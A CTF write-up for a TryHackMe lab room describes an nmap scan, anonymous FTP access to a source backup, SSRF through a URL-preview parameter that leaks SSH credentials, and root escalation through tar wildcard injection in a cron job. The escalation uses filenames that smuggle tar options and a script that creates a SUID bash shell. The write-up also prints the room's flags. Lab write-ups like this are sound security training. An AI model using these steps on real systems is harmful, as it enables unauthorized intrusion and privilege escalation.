
This is a writeup for a CTF from Junior Penetration Tester path on TryHackMe.

Room description: *Volt Labs, a small SaaS shop, suspects an old staging server has rotted into an exposed liability. Mara has assigned you the engagement. Find your way in and demonstrate full compromise.*

The room has two flags to grab, `user.txt` and `flag.txt`. So, let's begin!

First thing to do, as always is `nmap` scan, `nmap -A -v -p- -T4 10.114.146.221`

Results:
```
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.5
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_drwxr-xr-x    2 ftp      ftp          4096 May 09 23:14 pub
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to 10.114.104.27
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 2
|      vsFTPd 3.0.5 - secure, fast, stable
|_End of status
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.16 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 a6:9a:5f:21:94:6d:84:12:b6:e7:92:98:2b:8a:d9:32 (ECDSA)
|_  256 df:ed:8e:82:52:e3:b2:6b:5f:c8:53:23:b5:8e:38:44 (ED25519)
80/tcp open  http    gunicorn
|_http-server-header: gunicorn
| http-methods: 
|_  Supported Methods: GET HEAD OPTIONS
|_http-title: URL Preview - Volt Labs
```

Worth noting:
- FTP port 21 with anonymous login allowed
- SSH port 22 open
- Port 80 HTTP

I'll start with FTP, and check if there is something in there.
`ftp 10.114.146.221`
There is a directory on FTP called `pub`, and inside of it there is a backup file `backup.tar.gz`. I downloaded it and unzipped with command: `tar xfz backup.tar.gz`.
Inside was a directory `voltlabs-preview`, inside three files: `README.md`, `app.py` and `requirements.txt`.
In the `README.md` are important informations:
```
# Volt Labs URL Preview

Internal staging tool. Run with `gunicorn -b 0.0.0.0:80 app:app`.

Admin routes are gated by source-IP check (localhost only).
```

From `app.py`:
```
# Only requests targeting an approved internal hostname are forwarded.
# Internal hostname resolves to 127.0.0.1 via /etc/hosts on this box.
ALLOWED_HOSTS = {"kestrel.thm"}
```
and
```
@app.route("/admin/")
@app.route("/admin/<path:p>")
def admin(p="index"):
    if not request.remote_addr.startswith("127."):
        abort(403)
    if p == "notes":
        with open("/opt/voltlabs-preview/admin_notes.txt") as f:
            return "<pre>" + f.read() + "</pre>"
    return "<pre>Volt Labs admin endpoint.</pre>"
```

This means:
- I can access internal files with SSRF using `kestrel.thm` hostnames
- There is `/admin/notes` endpoint that needs to be checked out

Next, I moved to webpage. There is a *URL Preview* feature on the website, which fetches content of the website to preview it. When previewing a website, the URL is added to the parameter: `/preview?url=`.
This is an entry point for SSRF vulnerability.
I tried `http://kestrel.thm/admin/notes` and I successfully exploited it. I was able to view contents of a note:
```
<pre>=== INTERNAL ===
SSH access for staging:
  user: webdev
  pass: V0ltLabs#summer
- Mara
</pre>
```

Let's access machine via SSH now, with those creds.
`ssh webdev@10.114.146.221` and providing a password `V0ltLabs#summer`. And just like that, I'm in. I landed in `/ home/webdev` and read a first flag - `user.txt`.

**THM{96dc7bd50d2fb98fcece01560788b5ab}**

Now, I moved into finding a way to vertical privilege escalation.
I found a cronjob in the `/etc/cron.d` named `voltlabs-backup` which runs as root:
```
# Volt Labs staging backup - runs as root
SHELL=/bin/bash
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin

* * * * * root cd /opt/backups && tar czf /var/backups/uploads.tgz *
```

The `webdev` own `/opt/backups` which gives me write permissions into it.
First I created a malicious script in the `/opt/backups` directory.
```
cat > shell.sh <<'EOF'
#!/bin/bash
cp /bin/bash /tmp/rootbash
chmod +s /tmp/rootbash
EOF
```
`chmod +x shell.sh`

This script will copy `bash` to `/tmp/rootbash` and sets the SUID bit on it. When executed as root, `/tmp/rootbash -p` will give me a root shell.
Next I created two files whose names looks like `tar` options:
- `touch -- '--checkpoint=1'`
- `touch -- '--checkpoint-action=exec=sh shell.sh'`

The `--` after `touch` prevents `touch` from interpreting the leading `--` as an option. The filenames starts with `--`, which is exactly what we want.
After doing it, I waited for cron to be executed, I checked if `/tmp/rootbash` exists and has the SUID bit set, `ls -l /tmp/rootbash`. When it was present, I ran it with `/tmp/rootbash -p`.
And I got shell as root.
I checked `/root` directory and there was a second flag - `flag.txt`.

**THM{e6ee84a483d67ade06936fcfd1433e8a}**

 